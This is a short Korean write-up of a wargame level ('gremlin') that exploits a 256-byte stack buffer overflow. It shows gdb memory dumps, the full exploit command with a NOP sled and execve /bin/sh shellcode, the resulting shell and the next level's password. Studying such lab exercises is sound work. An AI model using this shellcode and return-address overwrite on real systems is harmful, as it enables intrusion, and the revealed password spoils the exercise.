argv[1]을 이용하여 bof하기
===

# Core Principle

argv[1]이후의 위치에 쉘 코드를 넣고 ret에 쉘코드가 들어가 있는 위치를 넣어서 쉘 코드를 실행시킨다.

# Result

이 문제에서 버퍼의 크기가 256이므로 260만큼 더미를 넣어서 ret값을 바꾼다.

이 점을 이용해 2개의 입력값 중 앞에 있는 값은 264개의 더미를 넣고 뒤에 있는 값의 주솟값을 찾는다.

> (gdb)  r &#96;python -c "print 'A'*260+'BBBB'"&#96; &#96;python -c "print 'CCCC'*20"&#96;
>
> Breakpoint 1, 0x8048430 in main ()
> (gdb) x/100x $esp
>
> ~중략~
>
> 0xbffffc4c:     0x41414141      0x41414141      0x41414141      0x41414141
> 0xbffffc5c:     0x41414141      0x42414141      0x00424242      0x43434343
> 0xbffffc6c:     0x43434343      0x43434343      0x43434343      0x43434343

저 실행때의 결과를 보고 0xbffffc6c로 좌표를 설정했지만 다시 확인 해 보았을 때는 0xbffffc5c가 적합해 보여서 5c로 바꾸었다.

> [gate@localhost gate]$ ./gremlin &#96;python -c "print 'A'*260 + '\x5c\xfc\xff\xbf' "&#96; &#96;python -c "print '\x90'*20+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' "&#96;
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\▒▒▒
> bash$ info
> info: Terminal type &#96;dumb' is not smart enough to run Info.
> bash$ my-pass
> euid = 501
> hello bof world
> bash$

위 처럼 쉘을 따는데 성공한 것을 볼 수 있다.

# Learned

> argv의 한 공간에 쉘코드를  넣어서도 쉘을 딸 수 있다.
>
> 슬라이드가 길었다면 좌표를 바꾸는 일은 하지 않았을 것이다. 앞으로는 충분히 긴 슬라이드를 이용하자.